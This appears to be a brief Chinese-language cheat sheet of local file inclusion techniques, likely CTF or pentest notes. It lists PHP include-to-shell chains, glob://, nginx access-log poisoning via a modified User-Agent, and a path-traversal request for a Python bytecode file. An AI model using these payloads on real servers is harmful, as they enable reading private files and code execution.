# LFI/文件包含

| Name                                                   | payload                                                |     |
| ------------------------------------------------------ | ------------------------------------------------------ | --- |
| `?file=index` 或 `?file=index.php` 有可能需要去掉 .php |                                                        |     |
| PHP_INCLUDE_TO_SHELL_CHAR_DICT                         |                                                        |     |
| glob://                                                |                                                        |     |
| 日志包含                                               | 1.抓包修改 Agent 访问 2.包含日志 /var/log/nginx/access.log |

# Python

```sh
/download?file=../../../app/__pycache__/part.cpython-311.pyc
```
